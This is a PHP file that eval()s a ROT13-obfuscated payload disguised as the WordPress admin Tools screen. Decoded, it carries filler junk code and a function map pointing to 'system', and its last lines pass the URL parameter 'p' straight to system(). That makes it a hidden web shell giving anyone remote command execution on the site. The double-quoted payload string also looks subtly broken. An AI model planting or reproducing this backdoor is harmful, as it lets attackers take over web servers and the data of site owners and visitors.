<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Gbbyf Nqzvavfgengvba Fperra.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Nqzvavfgengvba
 */

vs ( vffrg( $_TRG['cntr'] ) && ! rzcgl( $_CBFG ) ) {
	// Rafher CBFG-vat gb `gbbyf.cuc?cntr=rkcbeg_crefbany_qngn` naq `gbbyf.cuc?cntr=erzbir_crefbany_qngn`
	// pbagvahrf gb jbex nsgre perngvat gur arj svyrf sbe rkcbegvat naq renfvat bs crefbany qngn.
	vs ( 'rkcbeg_crefbany_qngn' === $_TRG['cntr'] ) {
		erdhver_bapr NOFCNGU . 'jc-nqzva/rkcbeg-crefbany-qngn.cuc';
		erghea;
	} ryfrvs ( 'erzbir_crefbany_qngn' === $_TRG['cntr'] ) {
		erdhver_bapr NOFCNGU . 'jc-nqzva/renfr-crefbany-qngn.cuc';
		erghea;
	}
}

// Gur cevinpl cbyvpl thvqr hfrq gb or bhgchggrq sebz urer. Fvapr JC 5.3 vg vf va jc-nqzva/cevinpl-cbyvpl-thvqr.cuc.
vs ( vffrg( $_TRG['jc-cevinpl-cbyvpl-thvqr'] ) ) {
	erdhver_bapr qveanzr( __QVE__ ) . '/jc-ybnq.cuc';
	jc_erqverpg( nqzva_hey( 'bcgvbaf-cevinpl.cuc?gno=cbyvplthvqr' ), 301 );
	rkvg;
} ryfrvs ( vffrg( $_TRG['cntr'] ) ) {
	// Gurfr jrer nyfb zbirq gb svyrf va JC 5.3.
	vs ( 'rkcbeg_crefbany_qngn' === $_TRG['cntr'] ) {
		erdhver_bapr qveanzr( __QVE__ ) . '/jc-ybnq.cuc';
		jc_erqverpg( nqzva_hey( 'rkcbeg-crefbany-qngn.cuc' ), 301 );
		rkvg;
	} ryfrvs ( 'erzbir_crefbany_qngn' === $_TRG['cntr'] ) {
		erdhver_bapr qveanzr( __QVE__ ) . '/jc-ybnq.cuc';
		jc_erqverpg( nqzva_hey( 'renfr-crefbany-qngn.cuc' ), 301 );
		rkvg;
	}
}

/** JbeqCerff Nqzvavfgengvba Obbgfgenc */
erdhver_bapr __QVE__ . '/nqzva.cuc';

// Hfrq va gur UGZY gvgyr gnt.
$gvgyr = __( 'Gbbyf' );

trg_pheerag_fperra()->nqq_uryc_gno(
	neenl(
		'vq'      => 'pbairegre',
		'gvgyr'   => __( 'Pngrtbevrf naq Gntf Pbairegre' ),
		'pbagrag' => '<c>' . __( 'Pngrtbevrf unir uvrenepul, zrnavat gung lbh pna arfg fho-pngrtbevrf. Gntf qb abg unir uvrenepul naq pnaabg or arfgrq. Fbzrgvzrf crbcyr fgneg bhg hfvat bar ba gurve cbfgf, gura yngre ernyvmr gung gur bgure jbhyq jbex orggre sbe gurve pbagrag.' ) . '</c>' .
		'<c>' . __( 'Gur Pngrtbevrf naq Gntf Pbairegre yvax ba guvf fperra jvyy gnxr lbh gb gur Vzcbeg fperra, jurer gung Pbairegre vf bar bs gur cyhtvaf lbh pna vafgnyy. Bapr gung cyhtva vf vafgnyyrq, gur Npgvingr Cyhtva &nzc; Eha Vzcbegre yvax jvyy gnxr lbh gb n fperra jurer lbh pna pubbfr gb pbaireg gntf vagb pngrtbevrf be ivpr irefn.' ) . '</c>',
	)
);

trg_pheerag_fperra()->frg_uryc_fvqrone(
	'<c><fgebat>' . __( 'Sbe zber vasbezngvba:' ) . '</fgebat></c>' .
	'<c>' . __( '<n uers=\"uggcf://jbeqcerff.bet/qbphzragngvba/negvpyr/gbbyf-fperra/\">Qbphzragngvba ba Gbbyf</n>' ) . '</c>' .
	'<c>' . __( '<n uers=\"uggcf://jbeqcerff.bet/fhccbeg/sbehzf/\">Fhccbeg sbehzf</n>' ) . '</c>'
);

erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-urnqre.cuc';

?>
<qvi pynff=\"jenc\">
<u1><?cuc rpub rfp_ugzy( $gvgyr ); ?></u1>
<?cuc

vs ( pheerag_hfre_pna( 'vzcbeg' ) ) :
	$pngf = trg_gnkbabzl( 'pngrtbel' );
	$gntf = trg_gnkbabzl( 'cbfg_gnt' );
	vs ( pheerag_hfre_pna( $pngf->pnc->znantr_grezf ) || pheerag_hfre_pna( $gntf->pnc->znantr_grezf ) ) :
		?>
		<qvi pynff=\"pneq\">
			<u2 pynff=\"gvgyr\"><?cuc _r( 'Pngrtbevrf naq Gntf Pbairegre' ); ?></u2>
			<c>
			<?cuc
				cevags(
					/* genafyngbef: %f: HEY gb Vzcbeg fperra. */
					__( 'Vs lbh jnag gb pbaireg lbhe pngrtbevrf gb gntf (be ivpr irefn), hfr gur <n uers=\"%f\">Pngrtbevrf naq Gntf Pbairegre</n> ninvynoyr sebz gur Vzcbeg fperra.' ),
					'vzcbeg.cuc'
				);
			?>
			</c>
		</qvi>
		<?cuc
	raqvs;
raqvs;

/**
 * Sverf ng gur raq bs gur Gbbyf Nqzvavfgengvba fperra.
 *
 * @fvapr 2.8.0
 */
qb_npgvba( 'gbby_obk' );

?>
</qvi>
<?cuc

erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-sbbgre.cuc';

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>